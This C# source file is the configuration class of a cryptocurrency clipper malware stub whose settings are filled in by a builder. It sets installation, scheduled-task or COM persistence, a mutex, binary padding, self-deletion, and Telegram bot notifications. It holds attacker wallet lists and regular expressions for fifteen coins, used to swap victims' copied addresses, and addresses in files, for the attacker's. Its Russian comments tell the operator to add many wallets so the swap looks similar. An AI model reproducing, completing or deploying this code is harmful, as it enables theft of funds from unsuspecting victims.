using System;
using System.Collections.Generic;
using System.Text.RegularExpressions;

namespace Stub
{
    class Config
    {
        public static bool install = Convert.ToBoolean("[INSTALL]");
        public static bool autoRun_Scheduler = Convert.ToBoolean("[RUN_SCHEDULER]");
        public static bool autoRun_COM = Convert.ToBoolean("[RUN_COM]");
        public static string sysDir = "[SYSDIR]";
        public static string dir = "[DIR]".Replace(" ", "_").Trim();
        public static string bin = "[BIN]".Replace(" ", "_").Trim();
        public static string taskName = "[TASKNAME]".Replace(" ", "_").Trim();
        public static bool sourcefileDelete = Convert.ToBoolean("[DELETE]");
        public static string MutEx = "[MUTEX]".Replace(" ", "_").Trim();
        public static bool AddBytes = Convert.ToBoolean("[ADDDBYTES]");
        public static int Addbkb = Convert.ToInt32("[ADDKB]");

        // Список форматов файлов для поиска и подмены кошельков в них не меняя структуру текста.
        public static string[] searchFilesPatterns =  "[FILES]".Split(',');
        public static bool fileReplacer = Convert.ToBoolean("[FILE_REPLACER]");


        public static bool tgNotifications = Convert.ToBoolean("[TG_API]");
        public static string botToken = "[TOKEN]".Trim();
        public static string chatId = "[USER_ID]".Trim();

        // Ваши кошельки для подмены, чем больше тем лучше.
        // Клиппер ищет самый похожий из списка по первым или последним символам.
        public static Dictionary<string, string[]> addresses = new Dictionary<string, string[]>()
        {
            {"btc", "[BTC]".Trim().Split('|') },
            {"bc1", "[BC1]".Trim().Split('|') },
            {"eth", "[ETH]".Trim().Split('|') },
            {"xmr", "[XMR]".Trim().Split('|') },
            {"xlm", "[XLM]".Trim().Split('|') },
            {"xrp", "[XRP]".Trim().Split('|') },
            {"ltc", "[LTC]".Trim().Split('|') },
            {"nec", "[NEC]".Trim().Split('|') },
            {"bch", "[BCH]".Trim().Split('|') },
            {"dash", "[DASH]".Trim().Split('|') },
            {"doge", "[DOGE]".Trim().Split('|') },
            {"trx", "[TRX]".Trim().Split('|') },
            {"zcash", "[ZCASH]".Trim().Split('|') },
            {"bnb", "[BNB]".Trim().Split('|') },
            {"ton", "[TON]".Trim().Split('|') },
        };

        // Регулярки.
        public static Dictionary<string, Regex> patterns = new Dictionary<string, Regex>()
        {
            {"btc", new Regex(@"\b[13][a-zA-HJ-NP-Z0-9]{26,35}\b")}, // Bitcoin 1/3
            {"bc1", new Regex(@"\b[bc1][a-zA-HJ-NP-Z0-9]{35,41}\b") }, // Bitcoin bc1
            {"eth", new Regex(@"\b0x[a-fA-F0-9]{40}\b") }, // Ethereum
            {"xmr", new Regex(@"\b[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93}\b") }, // Monero
            {"xlm", new Regex(@"\bG[0-9a-zA-Z]{55}\b") }, // Stellar
            {"xrp", new Regex(@"\br[0-9a-zA-Z]{24,34}\b") }, // Ripple
            {"ltc", new Regex(@"\b[LM][a-km-zA-HJ-NP-Z1-9]{26,33}\b") }, // Litecoin
            {"nec", new Regex(@"\b[AN][0-9a-zA-Z]{33}\b") }, // Neocoin
            {"bch", new Regex(@"\b(bitcoincash:)?(q|p)[a-z0-9]{41}\b") }, // Bitcoin Cash
            {"dash", new Regex(@"\bX[1-9A-HJ-NP-Za-km-z]{33}\b") }, // Dashcoin
            {"doge", new Regex(@"\bD[a-km-zA-HJ-NP-Z1-9]{33}$\b")  }, // DOGE Coin
            {"trx", new Regex(@"\bT[a-zA-Z0-9]{28,33}\b")  }, // Tron
            {"zcash", new Regex(@"\bt1[0-9A-z]{33}\b")  }, // Z-Cash
            {"bnb", new Regex(@"\bbnb[a-z0-9]{39}\b")  }, // Binance Coin
            {"ton", new Regex(@"\b[a-zA-Z0-9-_]{48}\b")  } // TON Coin
        };
    }
}
